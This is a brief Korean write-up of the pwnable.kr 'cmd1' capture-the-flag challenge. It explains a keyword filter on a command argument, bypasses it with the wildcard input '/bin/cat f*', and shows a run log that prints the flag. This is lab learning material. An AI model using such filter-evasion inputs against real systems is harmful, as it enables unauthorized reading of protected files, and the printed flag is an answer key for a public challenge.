# cmd1 writeup

## vul
문자열 하나를 인수로 받아서 `flag`, `sh`, `tmp`만을 필터링하고 실행한다.

코드랑 다른 분들 롸업 보면 환경변수로 푸는 걸 의도한 문제 같은데, 그냥 간단하고 빠르게 와일드카드를 써서 풀었다. 
역시 와일드카드는 최고야.

## run
```
 ⚙ junhoyeo@Macbookui-MacBook-Pro  ~/Documents/pwnable.kr/14. cmd1   master ●  python2 exploit.py2
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Opening new channel: './cmd1 "/bin/cat f*"': Done
[+] Receiving all data: Done (48B)
[*] Closed SSH channel with pwnable.kr
[*] FLAG : mommy now I get what PATH environment is for :)
```
